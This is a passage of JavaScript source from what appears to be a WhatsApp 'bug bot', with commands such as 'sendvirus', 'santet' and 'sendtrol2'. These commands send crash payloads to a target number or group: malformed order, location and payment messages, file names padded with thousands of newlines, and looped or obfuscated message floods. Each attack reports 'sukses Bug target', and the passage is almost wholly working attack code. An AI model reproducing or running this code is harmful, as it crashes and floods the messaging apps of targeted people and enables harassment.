haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${buttonkal}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext9': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${buttonvirus}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext10': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${ngazap(prefix)}`}, { quoted:m })
}
}
break
case 'sendvirus': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${iphone}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus2': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${iphone1}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus3': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${iphone2}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus4': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${iphone3}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus5': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${iphone4}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus6': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${iphone5}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus7': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${iphone6}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus8': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${buttonkal}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus9': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${buttonvirus}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus10': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${ngazap(prefix)}`}, { quoted:m })
}
break
//=================================================//
case 'jadijago': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
caption: ` ${teks}  ${buttonkal}`,
footer: ` ${teks} `,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `${teks}`, url: 'www.xnxxhwmods.com'}}, 
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🗡️'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🛡️'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🔧'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🪞'}}],
headerType: 5
}
haikal.sendMessage(m.chat, message, { quoted:m })
}
}
break
//=================================================//
case 'sendlokas': case 'sendlokas3': case 'sendlokas4': case 'sendlokas5': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m})
haikal.relayMessage(Pe, liveLocation.message, { messageId: liveLocation.key.id })
m.reply('sukses Bug target')
}
break
//=================================================//
case 'sendlokas2': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m})
haikal.relayMessage(Pe, location.message, { messageId: location.key.id })
m.reply('sukses Bug target')
}
break
//=================================================//
case 'sendtrol2': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${ngazap(prefix)}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted:m})
haikal.relayMessage(Pe, order.message, { messageId: order.key.id })
m.reply('sukses Bug target')
}
break
//=================================================//
case 'afk': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${m.pushName} Hello Saya Bot Hw Mods${text ? ': ' + text : ''}`)
}
break
//=================================================//
case '🔥': 
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
const buttons = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonMessage = {
text: "𝙘𝙞𝙡𝙤 𝙗𝙤𝙩",
footerText: 'Pe',
buttons: buttons,
headerType: 1
}
haikal.sendMessage(m.chat, buttonMessage)
}
 break
case 'inspect': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!args[0]) return m.reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return m.reply("Link Invalid")
haikal.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」
▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}

▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

▸ ID Group  : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}

©By Haikal`
try {
pp = await haikal.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
haikal.sendFile(m.chat, pp, "", m, { caption: tekse, mentions: await haikal.parseMention(tekse) })
})
}
break
//=================================================//
case '🦖': case '🦕': case '👿': case '⚔️': case '⚡': case '💥': case '🌪️': case '🍂': case '🐕': case '🗿': case '😱': case '😎': case '🥵': case '🥶': case '😂': case '😭': case '🤣': case '😈': {
if (!isPrem) return replyprem(mess.premium)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62881024911798','771192XPifQJ','6285714170944','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','reply\x20Menger','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20HW\x20MODS\x20WA','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'HW\x20MODS\x20WA','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
// BUG OWNER
case 'santet': case 'santet2': case 'santet3': case 'santet4': case 'santet5': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,
}
}}), { userJid: m.chat, quoted:m})
haikal.relayMessage(Pe, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
m.reply('sukses Bug target')
}
break
//=================================================//
case 'jagoan' : {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) return groupon(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:m})
}
}
break
//=================================================//
case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 m.reply('sukses Bug target')
}
break
case '🌹' : {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@g.us'
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(Pe, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
